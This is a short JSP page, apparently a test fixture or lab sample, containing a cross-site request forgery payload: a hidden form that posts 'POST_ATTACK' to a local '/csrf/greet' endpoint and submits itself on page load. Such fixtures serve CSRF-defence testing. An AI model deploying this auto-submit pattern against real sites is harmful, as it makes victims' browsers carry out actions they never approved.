<%@ page language="java" errorPage="" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.DataOutputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.net.HttpURLConnection" %>
<%@ page import="java.net.URL" %>

<html><body>
  <form name="csrf_form" action="http://127.0.0.1:8888/csrf/greet" method="POST">
    <input type="hidden" name="csrf_param" value="POST_ATTACK">
  </form>

  <script type="text/javascript">document.csrf_form.submit();</script>
</body></html>

